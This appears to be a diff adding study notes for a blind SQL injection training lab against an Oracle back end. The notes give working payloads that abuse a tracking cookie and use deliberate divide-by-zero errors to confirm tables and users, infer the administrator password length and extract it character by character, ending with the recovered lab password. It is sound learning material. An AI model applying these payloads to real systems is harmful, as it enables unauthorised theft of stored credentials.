@@ -1,0 +1,66 @@
+Lab:12 - Blind SQL injection with conditional errors
+
+Main Goal: 
+1> Find username and password of administrator
+2> login as administrator
+
+Vulnerable parameter - Tracking cookie
+
+Analysis:
+(1) Prove that parameter is Vulnerable
+
+' || (select '' from dual) || '  ->> oracle database
+
+' || (select '' from dualdemo) || '  --> error
+
+(2) Confirm that the users table exists in the database
+' || (select '' from  users where rownum=1) || '
+--> users table exists
+
+(3) Confirm that the administrator user exists in the users database
+
+' || (select '' from users where username='administrator') || '
+--> if username ='xyz' or 'administrator' it will give still return response 200
+---> bcz it will not run select state so that why error not generated
+
+
+' || (select CASE WHEN (1=0) THEN TO_CHAR(1/0) ELSE '' END FROM dual) || '
+---> if 1=1 is true then we intentionally generate error and also 1=0 means no error
+
+
+' || (select CASE WHEN (1=0) THEN TO_CHAR(1/0) ELSE '' END 
+FROM users where username='administrator') || '
+-> From clause always execute first in the query then after select clause execute
+-> If username= administrator exist in db then select will execute , this way we can Confirm
+that administrator user exits in db
+
+
+' || (select CASE WHEN (1=0) THEN TO_CHAR(1/0) ELSE '' END 
+FROM users where username='abcd') || '
+
+-> From clause always execute first in the query then after select clause execute
+-> If username= abcd exist in db then select will execute, this way we can Confirm
+that abcd user exits in db
+
+(4) Determine length of password
+
+' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END 
+FROM users where username='administrator' and LENGTH(password)>1) || '
+
+-> got error , which is good, not we know length of password greater then 1
+-> 200 response at 30 -> length of password is less then 30
+
+1 to 19 , internal server error 
+after 19 , got 200 
+so password length will be 19
+
+(5) output the administrator password
+
+' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END 
+FROM users where username='administrator' and substr(password,1,1)='a') || '
+
+-> a is not the first character of the password
+
+1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19
+
+93Omnr861tfe6u2tpk4
